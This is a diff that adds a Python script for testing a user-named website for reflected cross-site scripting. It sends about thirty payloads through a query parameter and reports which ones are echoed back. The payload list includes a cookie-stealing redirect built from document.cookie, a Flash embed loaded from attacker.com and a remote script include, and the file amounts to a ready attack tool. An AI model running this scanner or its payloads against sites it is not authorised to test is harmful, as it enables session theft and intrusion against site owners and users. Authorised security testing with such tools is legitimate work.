@@ -1,0 +1,58 @@
+import requests
+from bs4 import BeautifulSoup
+
+web_input = input("Enter name of website: ")
+website = "https://" + web_input
+
+# Example function to test reflected XSS
+def test_reflected_xss(url, payloads):
+    for payload in payloads:
+        # Properly encode the payload to ensure it's a valid query parameter
+        encoded_payload = requests.utils.quote(payload)
+        full_url = f"{url}?param={encoded_payload}"
+        response = requests.get(full_url)
+        if payload in response.text:
+            print(f"Possible XSS at {full_url}")
+        else:
+            print(f"No reflected XSS found with payload: {payload}")
+
+# Correctly handling dynamic website variable in payloads
+xss_scripts = [
+    "<script>alert('XSS');</script>",
+    f"<script>document.location='{website}/?'+document.cookie;</script>",  # Corrected
+    "\"><script>alert('XSS')</script>",
+    "<script>eval(location.hash.substr(1));</script>",
+    "<img src=\"x\" onerror=\"alert('XSS');\" />",
+    "<div id=\"xss\">XSS</div><script>document.getElementById(\"xss\").innerHTML = \"<img src='x' onerror='alert(\"XSS\");'>\";</script>",
+    "<a href=\"javascript:alert('XSS')\">Click me</a>",
+    "+ADw-script+AD4-alert('XSS');+ADw-/script+AD4-",
+    "<script>document.write(\"<img src='x' onerror='alert(\"XSS\");'>\");</script>",
+    "<object type=\"application/x-shockwave-flash\" data=\"http://attacker.com/xss.swf\" allowscriptaccess=\"always\"></object>",
+    "<svg/onload=alert('XSS')>",
+    "<div style=\"width: expression(alert('XSS'));\">XSS</div>",
+    "<script>setTimeout(\"alert('XSS')\", 1000);</script>",
+    "<iframe src=\"javascript:alert('XSS');\"></iframe>",
+    "\" onmouseover=\"alert('XSS')",
+    "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KCdYU1MnKSI+\"></img>",
+    "javascript:alert('XSS');",
+    "<input type=\"text\" onfocus=\"alert('XSS');\" autofocus />",
+    "<input type=\"text\" onblur=\"alert('XSS');\" autofocus />",
+    "<form action=\"javascript:alert('XSS')\"><input type=\"submit\"></form>",
+    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
+    "<script>window.opener.postMessage('XSS', '*');</script>",
+    "<a href=\"javascript:%61%6C%65%72%74%28%27%58%53%53%27%29\">Click me</a>",
+    "<body onload=alert('XSS')>",
+    f"<script src=\"{website}/xss.js\"></script>",  # Corrected
+    "<button onclick=\"alert('XSS')\">Click me</button>",
+    f"<embed src=\"{website}\" allowscriptaccess=\"always\"></embed>",  # Corrected
+    "<style>@import 'javascript:alert(\"XSS\")';</style>",
+    "<video src=\"x\" onerror=\"alert('XSS');\"></video>",
+    "<select onchange=\"alert('XSS')\"><option value=\"1\">XSS</option></select>",
+]
+
+# Extend the original list of payloads with the new XSS scripts
+payloads = ['<script>alert(1);</script>', '"<img src=x onerror=alert(1)>']
+payloads.extend(xss_scripts)
+
+# Example usage - Ensure you have permission before running this test
+test_reflected_xss(website, payloads)
